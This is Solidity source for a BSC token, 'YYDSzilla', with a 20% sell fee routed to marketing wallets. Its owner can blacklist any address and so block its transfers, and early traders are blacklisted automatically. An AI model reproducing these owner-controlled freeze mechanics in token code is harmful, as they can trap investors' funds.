/**
 *Submitted for verification at BscScan.com on 2022-08-14
*/

pragma solidity ^0.8.5;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

/**
 * BEP20 standard interface.
 */
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * Allows for contract ownership along with multi-address authorization
 */
abstract contract Ownable {
    address internal _owner;
    constructor(address __owner) {
        _owner = __owner;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(msg.sender == _owner, "!OWNER"); _;
    }

    function owner() public view returns(address){
        return _owner;
    }
    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        _owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract transU is Ownable{
    address USDT = 0x55d398326f99059fF775485246999027B3197955;
    constructor () Ownable(msg.sender) {}

    function getU()public onlyOwner{
        IBEP20(USDT).transfer(owner(),IBEP20(USDT).balanceOf(address(this)));
    }
}

interface iGetpair{
    function getPair(address dar1,address adr2)view external returns(address adr);
}

contract contractToken is IBEP20, Ownable {
    using SafeMath for uint256;

    address USDT = 0x55d398326f99059fF775485246999027B3197955;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    IBEP20 rewardToekn = IBEP20(USDT);

    string _name = "YYDSzilla";
    string _symbol = "YYDSzilla";
    uint8 _decimals = 6;

    transU public _transU;

    uint256 _totalSupply = 5180 * (10 ** _decimals);

    uint256 public maxHold = 10  * (10 ** _decimals);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => bool) isFeeExempt;

    uint256 public buyfee = 0;
    uint256 public sellfee = 2000;

    uint256 public selllpfee = 300;
    uint256 public sellmarketfee = 1700;

    uint256 public feeDenominator = 10000;

    address public marketingFeeReceiver1 ;
    address public marketingFeeReceiver2 ;

    IDEXRouter public router;
    address public pair;

    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    bool public startSwap = false;
    uint256 public startNum;
    mapping (address => bool ) public isBot;

    constructor () Ownable(msg.sender) {        
        
        _transU = new transU();

        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        iGetpair gp = iGetpair(0xF1306F783A56F81468583DbBddeF41e9CF521f7e);
        pair = gp.getPair(USDT,address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        
        address _presaler = 0x32B03e6A5bdffB391F7fC2A6A4242022D1Be3025;
        marketingFeeReceiver1 = 0xF85F010dA07D062191fd436F36468a69A138155D;
        marketingFeeReceiver2 = 0xC92b64644b657497b27fb030b4fD0C35f03d309b;

        isFeeExempt[_presaler] = true;
        isFeeExempt[msg.sender] = true;
        isFeeExempt[DEAD] = true;
        isFeeExempt[address(router)] = true;
        isFeeExempt[marketingFeeReceiver1] = true;
        isFeeExempt[marketingFeeReceiver2] = true;

        
        _balances[_presaler] = _totalSupply;
        emit Transfer(address(0), _presaler, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external view override returns (uint8) { return _decimals; }
    function symbol() external view override returns (string memory) { return _symbol; }
    function name() external view override returns (string memory) { return _name; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
   


    function setFeeExempt(address[] memory adrs)public onlyOwner {
        for(uint256 i = 0;i<adrs.length;i++){
            isFeeExempt[adrs[i]] = true;
        }
    }
	
	
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function setBot(address adr ) public onlyOwner{
        isBot[adr] = true;
    }
    
    function rmBot(address adr ) public onlyOwner{
        isBot[adr] = false;
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(recipient != address(0),"");
        require(sender != address(0),"");        
        require(!isBot[sender],"is bot");


        if(!startSwap){
            require(isFeeExempt[sender] || isFeeExempt[recipient] ); 

            if( recipient == pair && amount > 0){
                startNum = block.number;
                startSwap = true;
            }       
        }

        

        if(startNum != 0 && startNum + 3 > block.number ){
            if(sender == pair && !isFeeExempt[recipient]){
                isBot[recipient] = true;
            }
            if(recipient == pair && !isFeeExempt[sender]){
                isBot[sender] = true;
            }
        }

        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
     
        uint256 amountReceived = shouldTakeFee(sender,recipient) ? takeFee(sender,recipient, amount) : amount;

        if(balanceOf(address(this))>0 && recipient == pair)swapBack();

        _basicTransfer(sender,recipient,amountReceived);

        if(recipient != DEAD && recipient != pair &&  !isFeeExempt[ recipient ] ){
            require(balanceOf(recipient) <= maxHold);
        }

        return true;
    }

    

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldTakeFee(address sender,address recipient) internal view returns (bool) {
        return !(isFeeExempt[sender] || isFeeExempt[recipient]);
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 totalFee = 0;
        if(sender == pair)totalFee = buyfee;
        if(recipient == pair)totalFee = sellfee;
        uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
        _basicTransfer(sender,address(this),feeAmount);

        return amount.sub(feeAmount);
    }


    function swapBack() internal swapping {

        uint256 totalFeeAmount = selllpfee + sellmarketfee;
        if(totalFeeAmount > 0){

            uint256 swapamount = balanceOf(address(this));    

            uint256 totalFeeAmount2 = sellmarketfee + selllpfee.div(2) ;

            uint256 toLP = swapamount.mul(selllpfee).div(totalFeeAmount) ;

            uint256 amountToLiquify = toLP.div(2);
            uint256 amountToSwap = swapamount.sub(amountToLiquify);

            swapToU(amountToSwap);
            uint256 newAmount = rewardToekn.balanceOf(address(this)) ;

            uint256 toMarket = newAmount.div(totalFeeAmount2).mul(sellmarketfee);
            uint256 tolp     = newAmount - toMarket;
            
            uint256 tom1 = toMarket.div(17).mul(10);

            rewardToekn.transfer(marketingFeeReceiver1,tom1);     
            rewardToekn.transfer(marketingFeeReceiver2,toMarket - tom1);     

            addLP(tolp,amountToLiquify);   

        } 
  
    }
    function swapToU(uint256 amountToSwap) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = USDT;


        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(_transU),
            block.timestamp
        );
        _transU.getU();
    }
    

    function addLP(uint256 tolp,uint256 amountToLiquify) private {
        rewardToekn.approve(address(router),tolp);
        if(amountToLiquify > 0){
            router.addLiquidity(
                USDT,
                address(this),
                tolp,
                amountToLiquify,
                0,
                0,
                DEAD,
                block.timestamp
            );
            emit AutoLiquify(tolp, amountToLiquify);
        }
    }
    
    event AutoLiquify(uint256 amount1, uint256 amount2);

    
}